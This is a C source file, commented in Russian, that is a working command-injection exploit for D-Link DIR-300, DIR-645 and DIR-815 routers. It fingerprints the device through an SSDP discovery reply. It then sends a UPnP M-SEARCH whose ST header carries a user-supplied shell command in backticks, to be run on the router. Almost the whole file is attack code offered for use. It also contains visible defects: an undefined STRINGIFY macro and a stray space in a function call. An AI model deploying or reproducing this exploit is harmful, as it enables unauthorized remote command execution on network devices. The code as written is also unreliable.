// "D-Link DIR-300", D-Link DIR-645, D-Link DIR-815

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>

#define BUFFER_SIZE 65535
#define UPNP_PORT 1900
#define MULTICAST_ADDR "239.255.255.250"

// Функция для отправки UDP-запроса
void send_upnp_request(const char *cmd) {
    int sock;
    struct sockaddr_in server_addr;
    char request[BUFFER_SIZE];
    
    // Создание сокета
    if ((sock = socket(AF_INET, SOCK_DGRAM, 0)) < 0) {
        perror("Socket creation failed");
        return;
    }

    // Настройка адреса сервера
    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(UPNP_PORT);
    inet_pton(AF_INET, MULTICAST_ADDR, &server_addr.sin_addr);

    // Формирование запроса
    snprintf(request, sizeof(request),
             "M-SEARCH * HTTP/1.1\r\n"
             "Host: %s:%d\r\n"
             "ST:uuid:`%s`\r\n"
             "Man:\"ssdp:discover\"\r\n"
             "MX:2\r\n\r\n", MULTICAST_ADDR, UPNP_PORT, cmd);

    // Отправка запроса
    sendto(sock, request, strlen(request), 0, (struct sockaddr*)&server_addr, sizeof(server_addr));

    // Закрытие сокета
    close(sock);
}

// Функция для проверки уязвимости
int check_vulnerability() {
    int sock;
    struct sockaddr_in server_addr;
    char buffer[BUFFER_SIZE];
    socklen_t addr_len = sizeof(server_addr);

    // Создание сокета
    if ((sock = socket(AF_INET, SOCK_DGRAM, 0)) < 0) {
        perror("Socket creation failed");
        return 0;
    }

    // Настройка адреса сервера
    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(UPNP_PORT);
    inet_pton(AF_INET, MULTICAST_ADDR, &server_addr.sin_addr);

    // Формирование запроса
    const char *request = 
        "M-SEARCH * HTTP/1.1\r\n"
        "Host: " MULTICAST_ADDR ":" STRINGIFY(UPNP_PORT) "\r\n"
        "ST:upnp:rootdevice\r\n"
        "Man:\"ssdp:discover\"\r\n"
        "MX:2\r\n\r\n";

    // Отправка запроса
    sendto(sock, request, strlen(request), 0, (struct sockaddr*)&server_addr, sizeof(server_addr));

    // Получение ответа
    int bytes_received = recvfrom(sock, buffer, BUFFER_SIZE - 1, 0, (struct sockaddr*)&server_addr, &addr_len);
    buffer[bytes_received] = '\0'; // Завершение строки

    // Закрытие сокета
    close(sock);

    // Проверка на уязвимость
    if (strstr(buffer, "Linux, UPnP/1.0, DIR-") != NULL) {
        return 1; // Уязвимость найдена
    }

    return 0; // Уязвимость не найдена
}

int main(int argc, char *argv[]) {
    if (argc != 2) {
        printf("Usage: %s <command>\n", argv[0]);
        return 1;
    }

    const char *command = argv[1];

    if (check_vulnerability()) {
        send_upnp _request(command);
    }

    return 0;
}
